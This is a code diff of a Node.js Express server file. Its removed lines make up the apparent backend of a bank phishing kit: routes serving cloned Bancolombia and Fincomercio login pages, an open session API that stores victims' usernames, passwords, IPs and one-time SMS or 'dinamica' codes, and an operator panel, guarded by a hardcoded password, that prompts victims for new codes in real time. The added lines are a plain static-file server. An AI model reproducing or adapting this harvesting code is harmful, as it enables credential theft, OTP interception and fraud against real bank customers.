@@ -1,204 +1,24 @@
-const express = require("express");
-const path = require("path");
-const fs = require("fs");
-const app = express();
+import express from 'express'
+import { execSync } from 'node:child_process'
+import { existsSync } from 'node:fs'
+import path from 'node:path'
+import { fileURLToPath } from 'node:url'
 
-const PORT = Number(process.env.PORT) || 3000;
+const __dirname = path.dirname(fileURLToPath(import.meta.url))
+const dist = path.join(__dirname, 'dist')
+const port = Number(process.env.PORT) || 3000
 
-app.use(express.json());
+if (!existsSync(path.join(dist, 'index.html'))) {
+  execSync('npm run build', { stdio: 'inherit', cwd: __dirname })
+}
 
-const PANEL_USER = process.env.PANEL_USER || 'Morderkaiser';
-const PANEL_PASSWORD = process.env.PANEL_PASSWORD || 'M3q7Xp9Wv2R4k5T8zY'; // Cambiar en Render
+const app = express()
 
-const authMiddleware = (req, res, next) => {
-  const authHeader = req.headers.authorization;
-  if (!authHeader) {
-    res.setHeader('WWW-Authenticate', 'Basic realm="Admin Panel"');
-    return res.status(401).send('Authentication required');
-  }
+app.use(express.static(dist))
+app.get(/.*/, (_req, res) => {
+  res.sendFile(path.join(dist, 'index.html'))
+})
 
-  const authParts = authHeader.split(' ');
-  if (authParts.length !== 2 || authParts[0].toLowerCase() !== 'basic') {
-    res.setHeader('WWW-Authenticate', 'Basic realm="Admin Panel"');
-    return res.status(401).send('Authentication required');
-  }
-
-  const credentials = Buffer.from(authParts[1], 'base64').toString().split(':');
-  const user = credentials[0];
-  const pass = credentials[1];
-
-  if (user === PANEL_USER && pass === PANEL_PASSWORD) {
-    return next();
-  }
-
-  res.setHeader('WWW-Authenticate', 'Basic realm="Admin Panel"');
-  return res.status(401).send('Invalid credentials');
-};
-
-// ==========================================
-// API DE SESIONES (COMPARTIDA)
-// ==========================================
-let sessions = {};
-
-// 1. Create or update a session
-app.post('/api/sessions', (req, res) => {
-  const { id, username, password, tipoUsuario, device, ip, state } = req.body;
-  if (!id) return res.status(400).json({ error: 'Missing session id' });
-  
-  if (sessions[id]) {
-    sessions[id] = {
-      ...sessions[id],
-      username: username || sessions[id].username,
-      password: password || sessions[id].password,
-      tipoUsuario: tipoUsuario || sessions[id].tipoUsuario,
-      device: device || sessions[id].device,
-      ip: ip || sessions[id].ip,
-      state: state || sessions[id].state,
-      last_seen: Date.now(),
-      updatedAt: Date.now()
-    };
-  } else {
-    sessions[id] = {
-      id,
-      index: Object.keys(sessions).length + 1,
-      username: username || '—',
-      password: password || '—',
-      tipoUsuario: tipoUsuario || 'CODIGO_PERSONA',
-      device: device || 'desktop',
-      ip: ip || '127.0.0.1',
-      state: state || 'waiting',
-      token: '',
-      createdAt: Date.now(),
-      last_seen: Date.now(),
-      updatedAt: Date.now()
-    };
-  }
-  res.json({ success: true, session: sessions[id] });
-});
-
-// 2. Get all sessions (calculated online state)
-app.get('/api/sessions', authMiddleware, (req, res) => {
-  const now = Date.now();
-  const list = Object.values(sessions).map(s => {
-    const online = now - s.last_seen < 20000;
-    return { ...s, online };
-  });
-  res.json(list);
-});
-
-// 3. Get single session (polling check)
-app.get('/api/sessions/:id', (req, res) => {
-  const { id } = req.params;
-  const session = sessions[id];
-  if (!session) return res.status(404).json({ error: 'Session not found' });
-  res.json(session);
-});
-
-// 4. Update session token (from OTP page)
-app.post('/api/sessions/:id/token', (req, res) => {
-  const { id } = req.params;
-  const { token } = req.body;
-  if (!sessions[id]) return res.status(404).json({ error: 'Session not found' });
-  
-  sessions[id].token = token;
-  
-  const currentAction = sessions[id].action;
-  if (currentAction === 'sms') {
-    sessions[id].state = 'received-sms';
-  } else {
-    sessions[id].state = 'received-dinamica';
-  }
-  
-  sessions[id].action = null;
-  sessions[id].last_seen = Date.now();
-  sessions[id].updatedAt = Date.now();
-  res.json({ success: true, session: sessions[id] });
-});
-
-// 5. Update session ping (keepalive)
-app.post('/api/sessions/:id/ping', (req, res) => {
-  const { id } = req.params;
-  if (!sessions[id]) return res.status(404).json({ error: 'Session not found' });
-  
-  sessions[id].last_seen = Date.now();
-  res.json({ success: true });
-});
-
-// 6. Set action for a session (from operator panel)
-app.post('/api/sessions/:id/action', (req, res) => {
-  const { id } = req.params;
-  const { action, state } = req.body;
-  if (!sessions[id]) return res.status(404).json({ error: 'Session not found' });
-  
-  sessions[id].state = state || sessions[id].state;
-  sessions[id].action = action;
-  
-  if (action === 'dinamica' || action === 'sms') {
-    sessions[id].token = '';
-  }
-  
-  sessions[id].last_seen = Date.now();
-  sessions[id].updatedAt = Date.now();
-  res.json({ success: true, session: sessions[id] });
-});
-
-// 7. Update session state (from client page)
-app.post('/api/sessions/:id/state', (req, res) => {
-  const { id } = req.params;
-  const { state } = req.body;
-  if (!sessions[id]) return res.status(404).json({ error: 'Session not found' });
-  
-  sessions[id].state = state;
-  sessions[id].last_seen = Date.now();
-  sessions[id].updatedAt = Date.now();
-  res.json({ success: true, session: sessions[id] });
-});
-
-// 8. Clear all sessions
-app.post('/api/clear', authMiddleware, (req, res) => {
-  sessions = {};
-  res.json({ success: true });
-});
-
-// ==========================================
-// RUTAS Y RECURSOS ESTÁTICOS - PLAN A (BANCOLOMBIA)
-// ==========================================
-app.use('/plan-a/css', express.static(path.join(__dirname, 'plan-a/css')));
-app.use('/plan-a/js', express.static(path.join(__dirname, 'plan-a/js')));
-app.use('/plan-a/assets', express.static(path.join(__dirname, 'plan-a/assets')));
-
-app.get('/plan-a/login.html', (req, res) => res.sendFile(path.join(__dirname, 'plan-a/login.html')));
-app.get('/plan-a/clave.html', (req, res) => res.sendFile(path.join(__dirname, 'plan-a/clave.html')));
-app.get('/plan-a/index.html', (req, res) => res.sendFile(path.join(__dirname, 'plan-a/index.html')));
-
-app.use('/plan-a/panel', authMiddleware, express.static(path.join(__dirname, 'plan-a/panel')));
-
-app.get('/plan-a', (req, res) => res.redirect('/plan-a/login.html'));
-app.get('/plan-a/', (req, res) => res.redirect('/plan-a/login.html'));
-
-// ==========================================
-// RUTAS Y RECURSOS ESTÁTICOS - FINCOMERCIO
-// ==========================================
-app.use('/css', express.static(path.join(__dirname, 'css')));
-app.use('/js', express.static(path.join(__dirname, 'js')));
-app.use('/assets', express.static(path.join(__dirname, 'assets')));
-
-app.get('/canales.html', (req, res) => res.sendFile(path.join(__dirname, 'canales.html')));
-app.get('/portal.html', (req, res) => res.sendFile(path.join(__dirname, 'portal.html')));
-app.get('/recaudo.html', (req, res) => res.sendFile(path.join(__dirname, 'recaudo.html')));
-app.get('/index.html', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
-
-app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
-
-// Fallback genérico a index.html (evitando API y plan-a)
-app.get('*', (req, res, next) => {
-  if (req.path.startsWith('/api/') || req.path.startsWith('/plan-a/')) {
-    return next();
-  }
-  res.sendFile(path.join(__dirname, 'index.html'));
-});
-
-// Inicialización
-app.listen(PORT, () => {
-  console.log(`Unified server is running on port ${PORT}`);
-});
+app.listen(port, '0.0.0.0', () => {
+  console.log(`Cobre listening on ${port}`)
+})
